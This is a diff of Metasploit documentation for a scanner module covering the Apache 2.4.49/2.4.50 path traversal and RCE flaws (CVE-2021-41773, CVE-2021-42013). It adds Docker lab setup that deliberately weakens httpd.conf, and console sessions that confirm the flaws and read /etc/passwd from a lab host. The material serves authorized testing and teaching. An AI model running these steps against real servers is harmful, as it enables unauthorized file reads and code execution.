@@ -1,4 +1,5 @@
-This module scan for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
+This module scan for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773)
+and 2.4.50 (CVE-2021-42013).
 
 A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a
 path traversal attack to map URLs to files outside the expected document root.
@@ -7,11 +8,38 @@ If files outside of the document root are not protected by "require all denied" 
 
 Additionally this flaw could leak the source of interpreted files like CGI scripts.
 
+If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.
+
+It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient (CVE-2021-42013).
+
 ## Vulnerable Application
 
-This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
+This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and Apache 2.4.50 and
+not earlier versions.
 
 ### Make your lab
+
+#### Path Traversal
+
+```
+docker run -dit --name CVE-2021-41773 -p 8080:80 -v /opt/apache2.4.49:/usr/local/apache2/htdocs httpd:2.4.49
+docker exec -it CVE-2021-41773 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
+docker exec -it CVE-2021-41773 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
+docker stop CVE-2021-41773
+docker start CVE-2021-41773
+```
+
+--or--
+
+```
+docker run -dit --name CVE-2021-42013 -p 8080:80 -v /opt/apache2.4.50:/usr/local/apache2/htdocs httpd:2.4.50
+docker exec -it CVE-2021-42013 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
+docker exec -it CVE-2021-42013 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
+docker stop CVE-2021-42013
+docker start CVE-2021-42013
+```
+
+#### Remote Code Execution
 
 ```
 docker run -dit --name CVE-2021-41773 -p 8080:80 -v /opt/apache2.4.49:/usr/local/apache2/htdocs httpd:2.4.49
@@ -20,6 +48,17 @@ docker exec -it CVE-2021-41773 sed -i "0,/denied/s/denied/granted/" conf/httpd.c
 docker exec -it CVE-2021-41773 sed -i -E "s|all denied|all granted|g; s|#(.* cgid_.*)|\1|g" conf/httpd.conf
 docker stop CVE-2021-41773
 docker start CVE-2021-41773
+```
+
+--or--
+
+```
+docker run -dit --name CVE-2021-42013 -p 8080:80 -v /opt/apache2.4.50:/usr/local/apache2/htdocs httpd:2.4.50
+docker exec -it CVE-2021-42013 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
+docker exec -it CVE-2021-42013 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
+docker exec -it CVE-2021-42013 sed -i -E "s|all denied|all granted|g; s|#(.* cgid_.*)|\1|g" conf/httpd.conf
+docker stop CVE-2021-42013
+docker start CVE-2021-42013
 ```
 
 ## Verification Steps
@@ -35,48 +74,152 @@ docker start CVE-2021-41773
 
 Depth for path traversal. Default: 5
 
+**FILEPATH**
+
+The file you want to read. Default: `/etc/passwd`
+
+**StartMode**
+
+The module start mode. (Accepted: Traversal, RCE, Read)
+
+* Traversal: to check the vulnerability exposure, by default.
+* RCE: to check the remote code execution.
+* Read: to read remote file on the server.
+
 **TARGETURI**
 
 Base path. Default: `/cgi-bin`
 
+## Actions
+
+**Apache 2.4.49**
+
+Use Apache 2.4.49 Payload format (CVE-2021-41773).
+
+**Apache 2.4.49 and 2.4.50**
+
+Use Apache 2.4.49/2.4.50 Payload format (CVE-2021-42013).
+
 ## Scenarios
 
+### Check for vulnerability
+
+#### CVE-2021-42013 (by default)
+
 ```
-msf6 auxiliary(scanner/http/apache_normalize_path) > options 
-
-Module options (auxiliary/scanner/http/apache_normalize_path):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   DEPTH      5                yes       Depth for Path Traversal
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS     172.20.4.12      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
-   RPORT      8080             yes       The target port (TCP)
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   TARGETURI  /cgi-bin         yes       Base path
-   THREADS    1                yes       The number of concurrent threads (max one per host)
-   VHOST                       no        HTTP server virtual host
-
-msf6 auxiliary(scanner/http/apache_normalize_path) > set RHOSTS 172.20.4.12
-RHOSTS => 172.20.4.12
-msf6 auxiliary(scanner/http/apache_normalize_path) > set RPORT 8080
-RPORT => 8080
-msf6 auxiliary(scanner/http/apache_normalize_path) > set SSL false 
-SSL => false
+msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg RHOSTS 172.20.4.11
+RHOSTS => 172.20.4.11
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
+rport => 8080
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
+ssl => false
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
+verbose => true
 msf6 auxiliary(scanner/http/apache_normalize_path) > run
 
-[+] http://172.20.4.12:8080 - The target is vulnerable to CVE-2021-41773.
+[+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-42013.
+[*] Obtained HTTP response code 403.
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/apache_normalize_path) > vulns 
-
-Vulnerabilities
-===============
-
-Timestamp                Host         Name                                 References
----------                ----         ----                                 ----------
-2021-10-06 19:05:27 UTC  172.20.4.12  Apache 2.4.49 Traversal RCE scanner  CVE-2021-41773,URL-https://httpd.apache.org/security/vulnerabilities_24.html,URL-https://github.c
-                                                                           om/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse
-
-msf6 auxiliary(scanner/http/apache_normalize_path) > 
+msf6 auxiliary(scanner/http/apache_normalize_path) >
 ```
+
+#### CVE-2021-41773
+
+```
+msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg RHOSTS 172.20.4.11
+RHOSTS => 172.20.4.11
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
+rport => 8080
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
+ssl => false
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
+verbose => true
+msf6 auxiliary(scanner/http/apache_normalize_path) > set action Apache\ 2.4.49
+action => Apache 2.4.49
+msf6 auxiliary(scanner/http/apache_normalize_path) > run
+
+[+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-41773.
+[*] Obtained HTTP response code 403.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/apache_normalize_path) >
+```
+
+#### Check for RCE
+
+```
+msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg RHOSTS 172.20.4.11
+RHOSTS => 172.20.4.11
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
+rport => 8080
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
+ssl => false
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
+verbose => true
+msf6 auxiliary(scanner/http/apache_normalize_path) > set action Apache\ 2.4.49\ and\ 2.4.50
+action => Apache 2.4.49 and 2.4.50
+msf6 auxiliary(scanner/http/apache_normalize_path) > set StartMode RCE
+StartMode => RCE
+msf6 auxiliary(scanner/http/apache_normalize_path) > run
+
+[+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-42013 (mod_cgi enabled).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/apache_normalize_path) >
+
+```
+
+### Read file
+
+```
+msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg RHOSTS 172.20.4.11
+RHOSTS => 172.20.4.11
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
+rport => 8080
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
+ssl => false
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
+verbose => true
+msf6 auxiliary(scanner/http/apache_normalize_path) > set StartMode Read
+StartMode => Read
+msf6 auxiliary(scanner/http/apache_normalize_path) > run
+
+[+] 172.20.4.11:8080
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+[+] File saved in: /home/mekhalleh/.msf4/loot/20211008134549_default_172.20.4.11_apache.traversal_058623.bin
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/apache_normalize_path) >
+```
+## References
+
+  1. <https://httpd.apache.org/security/vulnerabilities_24.html>
+  2. <https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse>
+  3. <https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml>
+  4. <https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74>
+  5. <https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis>
+  
